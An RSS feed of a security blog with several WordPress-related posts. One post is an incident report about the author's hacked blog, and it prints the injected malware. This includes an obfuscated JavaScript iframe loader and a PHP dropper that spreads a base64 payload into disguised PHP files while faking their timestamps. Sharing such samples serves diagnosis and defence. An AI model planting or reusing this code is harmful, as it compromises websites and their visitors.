@@ -1,0 +1,341 @@
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
+	xmlns:content="http://purl.org/rss/1.0/modules/content/"
+	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
+	xmlns:dc="http://purl.org/dc/elements/1.1/"
+	xmlns:atom="http://www.w3.org/2005/Atom"
+	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
+	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
+	>
+
+<channel>
+	<title>Wordpress &#8211; Phocean.net</title>
+	<atom:link href="/blog-archive/tag/wordpress/feed" rel="self" type="application/rss+xml" />
+	<link>/blog-archive</link>
+	<description>Computer Security Blog</description>
+	<lastBuildDate>Fri, 24 Feb 2017 21:17:51 +0000</lastBuildDate>
+	<language>en-US</language>
+	<sy:updatePeriod>hourly</sy:updatePeriod>
+	<sy:updateFrequency>1</sy:updateFrequency>
+	<generator>https://wordpress.org/?v=4.9.10</generator>
+	<item>
+		<title>OpenID rants</title>
+		<link>/blog-archive/2010/07/23/openid-rants.html</link>
+		<pubDate>Fri, 23 Jul 2010 03:44:37 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Defense]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Authentication]]></category>
+		<category><![CDATA[OpenID]]></category>
+		<category><![CDATA[password]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=877</guid>
+		<description><![CDATA[After I tried to set this blog as my own OpenID provider using the OpenID WordPress plugin, I got a weired error message: &#8220;This is an OpenID Server, Nothing to See Here&#8230; Move Along&#8221; I could not find what as wrong, as all prerequisites were fulfilled, until I find this nice post. The patch there...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2010/07/23/openid-rants.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>After I tried to set this blog as my own OpenID provider using the <a title="OpenID WordPress Plugin" href="http://wordpress.org/extend/plugins/openid/" target="_blank">OpenID WordPress plugin</a>, I got a weired error message:</p>
+<p><em>&#8220;This is an OpenID Server, Nothing to See Here&#8230; Move  Along&#8221;</em></p>
+<p>I could not find what as wrong, as all prerequisites were fulfilled, until I find this <a title="openID server" href="http://patchlog.com/wordpress/openid-server-on-php-5-3/" target="_blank">nice post</a>. The patch there works very well, thanks to the author (it is a shame that it wasn&#8217;t yet included in the trunk).</p>
+<p>This and the lack of active open-source development around OpenID seems to show that it is not really popular. It is a shame because it is a pretty good solution against the multiplication of passwords. I wouldn&#8217;t want to use OpenID for my bank account access, but it is just right for many sites, forums, etc. Unfortunately, no many sites are yet OpenID enabled and the choice when you want to become your own provider is very limited (most of projects listed in the official wiki are dead, with no update for the last 2 years).</p>
+]]></content:encoded>
+			</item>
+		<item>
+		<title>Hacked !</title>
+		<link>/blog-archive/2008/06/03/hacked.html</link>
+		<comments>/blog-archive/2008/06/03/hacked.html#comments</comments>
+		<pubDate>Tue, 03 Jun 2008 20:25:25 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Forensic]]></category>
+		<category><![CDATA[Hardware]]></category>
+		<category><![CDATA[Linux]]></category>
+		<category><![CDATA[News]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[Hacking]]></category>
+		<category><![CDATA[Injection]]></category>
+		<category><![CDATA[PHP]]></category>
+		<category><![CDATA[Spam]]></category>
+		<category><![CDATA[SQL]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=109</guid>
+		<description><![CDATA[This blog got hacked yesterday. It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress. It was not just like the classic SQL injection that is usually used to post some malicious post. The following code was added : &#60;?php echo '&#60;script type=&#34;text/javascript&#34;&#62;function count(str){var res = &#34;&#34;;for(i...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/06/03/hacked.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>This blog got hacked yesterday.</p>
+<p>It looks like some spammer managed to inject some PHP code into almost all *.php files of WordPress.<br />
+It was not just like the classic SQL injection that is usually used to post some malicious post.</p>
+<p>The following code was added :</p>
+<pre>&lt;?php echo '&lt;script type=&quot;text/javascript&quot;&gt;function count(str){var res = &quot;&quot;;for(i = 0; i &lt; str.length; ++i) { n = str.charCodeAt(i); res += String.fromCharCode(n - (2)); } return res; }; document.write(count(&quot;&gt;khtcog\&quot;ute?jvvr&lt;11yyy0yr/uvcvu/rjr0kphq1khtcog1yr/uvcvu0rjr\&quot;ykfvj?3\&quot;jgkijv?3\&quot;htcogdqtfgt?2@&quot;));&lt;/script&gt;';?&gt;</pre>
+<p><span id="more-109"></span></p>
+<p>It make me think that there is a serious vulnerability somewhere on WordPress or a plugin, though my versions were up-to-date.</p>
+<p>Now the blog is back to normal, after a clean reinstallation (erased all the former files).</p>
+<p><a title="Wordpress, hacked" href="http://wordpress.org/support/topic/179428/page/2" target="_blank">I am not the only one to experience this mess</a>.</p>
+<p>For now, the blog is running with a minimal number of plugin &#8211; just akismet, actually &#8211; until the cause of that gets clearer.</p>
+<p>Not a lot of plugins runned before, so it mainly means that the OpenID support for authentication is cut off.</p>
+<p>As my php knowledge is very low, anyone having some tips is welcome. I love WordPress, I would like to avoid looking for another platform or switch to static html !</p>
+<p>&#8212;</p>
+<p><strong>UPDATE 06/13/2008 :</strong><br />
+As C.S Lee suggested in a comment, there were a very suspicious wp-stats.php file in the root of my hacked archive.</p>
+<p>There is the code :</p>
+<pre>
+&lt;?php
+
+@error_reporting(E_ALL);
+@set_time_limit(0);
+mt_srand(crc32(microtime()));
+  
+  
+define('SHCODE', 'PDaWYgKCRjb2RlID0gQGZyZWFkKEBmb3BlbigkSFRUCmVjaG8gIjwvcHJlPiI7Cj8+');
+
+$pres = array('lib_','co_','pre_','net_','func_','ad_','ext_','new_','old_','fix_','fixed_','na_','av_','fx_');  
+$fui = $pres[array_rand($pres)];
+
+global $HTTP_SERVER_VARS;
+$START = time();
+$WD_TIMEOUT = array(8, 7, 6, 6, 5, 5, 5, 5, 0);
+
+function my_fwrite($f, $data) {
+  global $CURFILE;
+  $file_mtime = @filemtime($f);
+  $file_atime = @fileatime($f);
+  $dir_mtime = @filemtime(@dirname($f));
+  $dir_atime = @fileatime(@dirname($f));
+  if ($file_h = @fopen($f, &quot;wb&quot;)) {
+    @fwrite($file_h, $data); @fclose($file_h);
+    if ($file_mtime) {
+      @touch($f, $file_mtime, $file_atime);
+    } elseif (@filemtime($CURFILE)) {
+      @chmod($f, @fileperms($CURFILE));
+      @touch($f, @filemtime($CURFILE), @fileatime($CURFILE));
+      @chgrp($f, @filegroup($CURFILE));
+      @chown($f, @fileowner($CURFILE));
+    };
+    if ($dir_mtime) @touch(@dirname($f), $dir_mtime, $dir_atime);
+    return $f;
+  } else {
+    return '';
+  };
+};
+
+function ext($f) {
+  return substr($f, strrpos($f, &quot;.&quot;) + 1);
+};
+
+function walkdir($p, $func='_walkdir', $l=0) {
+  global $START;
+  global $WD_TIMEOUT;
+  global $FL;
+  $func_f = &quot;{$func}_f&quot;;
+  $func_d = &quot;{$func}_d&quot;;
+  $func_s = &quot;{$func}_s&quot;;
+  $func_e = &quot;{$func}_e&quot;;
+  if ($dh = @opendir(&quot;$p&quot;)) {
+    if (function_exists($func_s)) {
+      if ($func_s($p, $l)) return 1;
+    };
+    while ($f = @readdir($dh)) {
+      if (time() - $START &gt;= $WD_TIMEOUT[$l] ) break;
+      if ($f == '.' || $f == '..' ) continue;
+      if (@is_dir (&quot;$p$f/&quot;) ) walkdir(&quot;$p$f/&quot;, $func, $l+1);
+      if (@is_dir (&quot;$p$f/&quot;) &amp;&amp; function_exists($func_d))
+        $func_d(&quot;$p$f/&quot;, $l);
+      if (@is_file(&quot;$p$f&quot; ) &amp;&amp; function_exists($func_f))
+        $func_f(&quot;$p$f&quot; , $l);
+    };
+    closedir($dh);
+    if (function_exists($func_e)) $func_e($p, $l);
+  };
+};
+
+function r_cut($p) {
+  global $R;
+  return substr($p, strlen($R));
+};
+
+function say($t) {
+  echo &quot;$t\n&quot;;
+};
+
+function testdata($t) {
+  say(md5(&quot;mark_$t&quot;));
+};
+
+$R = $HTTP_SERVER_VARS['DOCUMENT_ROOT'];
+$CURFILE = $HTTP_SERVER_VARS['DOCUMENT_ROOT'] .
+  $HTTP_SERVER_VARS['SCRIPT_NAME'];
+echo &quot;&lt;pre&gt;&quot;;
+testdata('start');
+$fe = ext($CURFILE);
+if (!$fe) $fe = 'php';
+//$FN = &quot;namogofer.$fe&quot;;
+
+function _walkdir_s($d, $l) {
+  global $FCNT;
+  $FCNT = array( 'fn' =&gt; '', 'dir' =&gt; 0, 'file' =&gt; 0, 'simtype' =&gt; 0 );
+};
+
+function _walkdir_d($d,$l) {
+  global $FCNT;
+  $FCNT['dir' ]++;
+};
+
+function _walkdir_f($f,$l) {
+  global $FCNT, $CURFILE;
+  $FCNT['file']++;
+  if (ext($f) == ext($CURFILE)) $FCNT['simtype']++;
+};
+
+function update_passwd($data)
+  {
+  global $FCNT;
+  $password = &quot;&quot;;
+  $possible = &quot;abcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789~!@#$%^&amp;*&quot;; 
+  $i = 0;
+  while ($i &lt; 15) 
+    { 
+    $char = substr($possible, mt_rand(0, strlen($possible)-1), 1);
+    if (!strstr($password, $char)) 
+      { 
+      $password .= $char;
+      $i++;
+      }
+    }
+  $FCNT['passwd'] = $password;
+  $md5password = md5($password);
+  return preg_replace(&quot;|define\('PASSWD',\s*'(.*)'|&quot;, &quot;define('PASSWD','$md5password'&quot;, $data);
+  }
+
+function notinf($ar, $tx)
+  {
+  $R = true;
+  foreach ($ar as $ca)
+    {
+    //echo &quot;pass &quot;.substr($tx, 0, strlen($ca)).&quot; in $tx for $ca\n&quot;;
+    if (&quot;$ca&quot; == substr($tx, 0, strlen($ca)))
+      {
+      $R = false;
+      //echo &quot;gotcha\n&quot;;
+      break;
+      }
+    }
+  return $R;
+  }
+
+function _walkdir_e($d,$l) 
+  {
+  global $C, $FCNT, $FN, $fui, $pres;
+  
+    $the_data = base64_decode(SHCODE);
+    $the_dir = opendir(&quot;$d&quot;);
+    $is_php=false;
+    if ($the_dir)
+        while($cfile = readdir($the_dir))
+            {
+            if(
+                $is_php=
+                
+                (('.php' == substr($cfile, -4))and
+                 notinf($pres, $cfile)and
+                ($cfile!='index.php'))
+                 
+              )
+              {
+              $FN = &quot;$fui$cfile&quot;;
+              break;
+              }
+              else
+              {
+              //echo &quot;pass $cfile\n&quot;;
+              }
+            }
+                         
+        if ( $is_php and my_fwrite(&quot;$d$FN&quot;, str_repeat(&quot;\n&quot;,100) . str_repeat('', 150) .
+                    update_passwd($the_data . str_repeat(' ', 150) . &quot;\n&quot; . str_repeat(&quot;\n&quot;, 100))))
+                    {
+                    $FCNT['fn'] = r_cut(&quot;$d$FN&quot;);
+                    say(implode(&quot; &quot;, $FCNT));
+                    }
+
+  };
+
+walkdir(&quot;$R/&quot;);
+testdata('end');
+?&gt;</pre>
+<p>I will try anyway to put a deeper look when I have a little time : now, I have to go to work.</p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/06/03/hacked.html/feed</wfw:commentRss>
+		<slash:comments>5</slash:comments>
+		</item>
+		<item>
+		<title>OpenID is gaining popularity</title>
+		<link>/blog-archive/2008/01/17/openid-is-gaining-popularity.html</link>
+		<comments>/blog-archive/2008/01/17/openid-is-gaining-popularity.html#comments</comments>
+		<pubDate>Thu, 17 Jan 2008 16:33:08 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Security]]></category>
+		<category><![CDATA[Authentication]]></category>
+		<category><![CDATA[OpenID]]></category>
+		<category><![CDATA[SSO]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=95</guid>
+		<description><![CDATA[Yahoo just announced that it will support OpenID. OpenID is an interesting initiative to provide single-sign-on to user. It is both secure and simple, so it will be probably spread out quickly. You can get your own OpenID by suscribing to a provider or setting up your own server if you got a domain name....<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2008/01/17/openid-is-gaining-popularity.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p><a title="Yahoo supports OpenID" href="http://www.zdnet.fr/actualites/internet/0,39020774,39377529,00.htm?xtor=RSS-1">Yahoo</a> just announced that it will support OpenID.</p>
+<p>OpenID is an interesting initiative to provide single-sign-on to user. It is both secure and simple, so it will be probably spread out quickly.</p>
+<p>You can get your own OpenID by suscribing to a provider or setting up your own server if you got a domain name.</p>
+<p>I will soon write an complete post about it, but now you can already check <a title="OpenID.net" href="http://openid.net/">the official OpenID site</a>.</p>
+<p>Note that this blog already supports OpenID !<noscript></noscript><noscript></noscript></p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2008/01/17/openid-is-gaining-popularity.html/feed</wfw:commentRss>
+		<slash:comments>3</slash:comments>
+		</item>
+		<item>
+		<title>md5 hash googling &#8211; and WordPress password weakness</title>
+		<link>/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html</link>
+		<comments>/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html#comments</comments>
+		<pubDate>Mon, 26 Nov 2007 07:38:16 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[Cryptography]]></category>
+		<category><![CDATA[Security]]></category>
+		<category><![CDATA[hash]]></category>
+		<category><![CDATA[MD5]]></category>
+		<category><![CDATA[Vulnerability]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=86</guid>
+		<description><![CDATA[Some Md5 password implementation &#8211; without a salt, become more insecure than ever. There is an issue right now with WordPress, I hope they will fix it soon ! Check this interesting article. No need to take out your rainbow tables anymore, just google your hash ! I hope your password is strong enough&#8230; You...<br><i class="icon-right-hand"></i> <span class="read-more"><a href="/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html">Continue Reading</a></span>]]></description>
+				<content:encoded><![CDATA[<p>Some Md5 password implementation &#8211; without a salt, become more insecure than ever. There is an issue right now with WordPress, I hope they will fix it soon !</p>
+<p><a title="Lightbluetouchpaper - md5" href="http://www.lightbluetouchpaper.org/" target="_blank">Check this interesting article</a>.</p>
+<p>No need to take out your rainbow tables anymore, just google your hash ! I hope your password is strong enough&#8230;</p>
+<p>You could also use one of these :</p>
+<p><a title="md5 rednoize" href="http://md5.rednoize.com/" target="_blank">http://md5.rednoize.com</a></p>
+<p><a title="md5 cryptobitch" href="http://md5.cryptobitch.de" target="_blank">http://md5.cryptobitch.de </a></p>
+]]></content:encoded>
+			<wfw:commentRss>/blog-archive/2007/11/26/md5-hash-googling-and-wordpress-password-weakness.html/feed</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Dotclear 2 to WordPress migration</title>
+		<link>/blog-archive/2007/05/19/dotclear-2-to-wordpress-migration.html</link>
+		<pubDate>Sat, 19 May 2007 08:29:11 +0000</pubDate>
+		<dc:creator><![CDATA[phocean]]></dc:creator>
+				<category><![CDATA[News]]></category>
+		<category><![CDATA[Dotclear]]></category>
+		<category><![CDATA[Wordpress]]></category>
+
+		<guid isPermaLink="false">http://www.phocean.net/?p=32</guid>
+		<description><![CDATA[Dotclear 2 has been bêta for too long and I thought it was time to go over the limitations of a bêta version.
+
+It seems that many people around have done that way and Wordpress is so popular that I should consider to give a try to it.]]></description>
+				<content:encoded><![CDATA[<p>Dotclear 2 has been bêta for too long and I thought it was time to go over the limitations of a bêta version.</p>
+<p>It seems that many people around have done that way and WordPress is so popular that I should consider to give a try to it.<span id="more-32"></span></p>
+<p>For the migration, under Dotclear 2, I exported all the content into a flat text file.</p>
+<p>Then, I installed WordPress : an extremely easy thing ! I have seen many php software easy to set up, but here it is just impressive. Great work&#8230;</p>
+<p>Then I put the <a title="flatimport" href="/blog-archive/wp-content/uploads/2007/05/flatimport.txt">flatimport</a> plug-in into the <strong>wp-admin/import </strong>folder, renaming it with a .php extension.</p>
+<p>Finally, just go to the plug-in management interface of WordPress and import it ! That went smoothly for me, but still, as expected, the images were missing in my articles.</p>
+<p>As both blogs and all my pictures were on the same server, I just needed to move the public directory of Dotclear (containing all images) to the wp-content/uploads folder.</p>
+<p>If your pictures have miscellanous origins, don&#8217;t worry, there is a nice plug-in that very easely fetch all the image links of your blog and put the corresponding pictures into the WordPress folder. Look at <a title="Images to WordPress import" href="http://www.bloggingexpertise.com/plugins/cache-images/" target="_blank">there</a>.</p>
+<p><a title="Importing to Worpdress" href="http://cvie.free.fr/public/tuto_dc2wp_en.html">On this page</a>, there are also more complete instructions in case you need.</p>
+<p>After a few hours of use, I can already say that WordPress is an nice piece of software : it is very simple to use, but also very functional and aesthetic. So far, there is every thing I need.</p>
+<p>The community looks also much bigger than Dotclear, which means a lot of plug-ins and additional functionalities. :)</p>
+]]></content:encoded>
+			</item>
+	</channel>
+</rss>
